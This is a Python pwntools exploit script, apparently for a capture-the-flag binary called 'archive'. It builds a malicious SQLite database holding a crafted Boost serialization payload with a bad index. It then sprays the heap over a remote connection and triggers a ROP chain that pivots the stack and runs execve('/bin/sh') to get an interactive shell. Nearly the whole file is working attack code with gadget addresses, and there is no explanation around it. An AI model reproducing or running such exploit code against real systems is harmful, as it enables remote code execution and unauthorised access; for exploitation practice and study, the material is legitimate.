#!/usr/bin/env python3
import pwn
import sys
import base64
import sqlite3
import os
from binascii import hexlify, unhexlify

pwn.context.terminal = ['tmux', 'splitw', '-h']

def makeSprayLib():
    os.system("rm spray_library")
    conn = sqlite3.connect('spray_library')
    cursor = conn.cursor()

    for i in range(56):
        table = f'table{i}' + 'B'*1024
        field = 'B'*1024

        create_table_query = f'''
        CREATE TABLE IF NOT EXISTS {table} (
            id INTEGER PRIMARY KEY,
            {field} BLOB
        );'''

        cursor.execute(create_table_query)
        conn.commit()

    conn.close()

    data = open('spray_library', 'rb').read()
    return base64.b64encode(data)

def makeTriggerLibrary():
    os.system("rm library")
    conn = sqlite3.connect('library')
    cursor = conn.cursor()

    create_table_query = '''
    CREATE TABLE IF NOT EXISTS books (
        id INTEGER PRIMARY KEY,
        data TEXT
    );'''

    cursor.execute(create_table_query)
    conn.commit()

    # 22 serialization::archive 18 <evil_idx> 1 1\n0 3 kek 3 pek 1777
    # 2900, 2355, -3083
    payload = '22 serialization::archive 18 -3083 1 1\n0 3 kek 3 pek 1777'
    cursor.execute(f"INSERT INTO books (data) VALUES ('{payload}');")
    conn.commit()

    data = open('library', 'rb').read()
    return base64.b64encode(data)

if __name__ == "__main__":
    os.system("rm ./libraries/*")

    r = pwn.remote(sys.argv[1], int(sys.argv[2]))
    #r = pwn.process("./archive")
    #pwn.gdb.attach(r, '''b *0x523551\nb *0x523573''')
    # b *0x5259E3 - get fake struct from heap
    # b *0x524797 - call of first fake ptr
    #pwn.gdb.attach(r, '''b *0x5259E3\nb *0x524797''')

    trig_lib = makeTriggerLibrary()
    #spray_lib = makeSprayLib()

    lib_name = os.urandom(16).hex()

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", lib_name.encode())
    r.sendlineafter(b": ", trig_lib)
    r.sendlineafter(b": ", b'n')
    pwn.pause()
    # r.sendlineafter(b"> ", b"1")
    # r.sendlineafter(b": ", b"keksik_spray")
    # r.sendlineafter(b": ", spray_lib)
    # r.sendlineafter(b": ", b'n')
    
    #payload = pwn.p64(0xDEADBEEFBAADC0DE) + pwn.p64(0x603040)*4 +  pwn.p64(0xDEADBEEFBAADC0DE) * (((1024 * 16) // 8) - 5)
    #payload =  (b'./data/exp.so\x00\x00\x00' + pwn.p64(0x443537)*6 + b'./books/exp.so\x00\x00') * (((1024)))
    # 0x443537, 69D9C4, 630A90
    # worked fine
    #payload =  (b'./books/e.so\x00\x00\x00\x00' + pwn.p64(0x0) + pwn.p64(0x62B759)*3 + b'./books/e.so\x00\x00\x00\x00' + pwn.p64(0x0) + pwn.p64(0x62B759)*4) * 1024

    # 0x00000000004021e3 - xor rax, rax; ret
    address1 = 0x00000000005745b0 # : xor rax, rax ; ret
    address2 = 0x00000000005745b0 # 
    address3 = 0x00000000005745b0 # SECOND_CALL : add rsp, 0x30 ; add rsp, 8 ; ret # : ret

    # chain = [
    #     pwn.p64(0x4141414141414141),
    #     pwn.p64(0x4242424242424242),
    #     pwn.p64(0x4343434343434343),
    #     pwn.p64(0x00000000007a1fd6), # first_call # mov esp, edx ; mov esi, 0xa ; call qword ptr [rax + 0x50] # PIVOT STACK HERE
    #     pwn.p64(0x00000000007a1fd6), # second_call #
    #     pwn.p64(0x00000000007a1fd6), # read()
    # ]


    rop_execve = [
        pwn.p64(0x000000000043e23a), # : pop rsi ; ret
        pwn.p64(0x0), # 0x0
        pwn.p64(0x000000000043e23a), # : pop rsi ; ret
        pwn.p64(0xB2D900), # bss addr 
        pwn.p64(0x000000000045aaa6), # : pop rdx ; ret # <-
        b'/bin/sh\x00',
        pwn.p64(0x00000000006c917f), # : mov qword ptr [rsi], rdx ; ret
        pwn.p64(0x000000000061ca54), # : pop rdi ; pop rbp ; ret)
        pwn.p64(0xB2D900), # bss addr
        pwn.p64(0x0), # bss addr
        pwn.p64(0x000000000043e23a), # : pop rsi ; ret
        pwn.p64(0),
        pwn.p64(0x000000000045aaa6), # : pop rdx ; ret
        pwn.p64(0),
        pwn.p64(0x000000000043fd6d), # : pop rax ; ret # <- +8
        pwn.p64(0x3b),
        pwn.p64(0x0000000000417c7d) # : syscall
    ]
    
    payload = b''
    payload = (b'X'*8)*7
    chain = [
        pwn.p64(0x4141414141414141),
        pwn.p64(0x4242424242424242),
        pwn.p64(0x4343434343434343),
        pwn.p64(0x00000000007a1fd6), # FIRST_CALL # mov esp, edx ; mov esi, 0xa ; call qword ptr [rax + 0x50] # PIVOT STACK HERE
        pwn.p64(0x00000000007a1fd6), # 
        pwn.p64(0x00000000007a1fd6), # 
        pwn.p64(0x0) * 4,
        pwn.p64(0x00000000005f9271) #  add rsp, 0x10 ; pop r12 ; ret
    ]

    # # chain size == 11
    payload += b''.join(chain)

    for i in range(11):
        byte = 0x41 + i
        payload += pwn.p64(byte)

    payload += b''.join(rop_execve)

    while len(payload) != (65*8):
        payload += pwn.p64(0x41)

    # for i in range(65):
    #     byte = 0x41 + i
    #     payload += pwn.p64(byte)

    #payload =  (b''.join(chain) + pwn.p64(address1) + pwn.p64(0x0) + pwn.p64(address2) + pwn.p64(0x0) + pwn.p64(address3) + pwn.p64(0x0)) * 1024
    payload = payload * 64

    # fill heap with our spray
    for _ in range(16):
        r.sendlineafter(b"> ", b"2")
        r.sendlineafter(b": ", payload)

    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", lib_name.encode())
    
    r.interactive()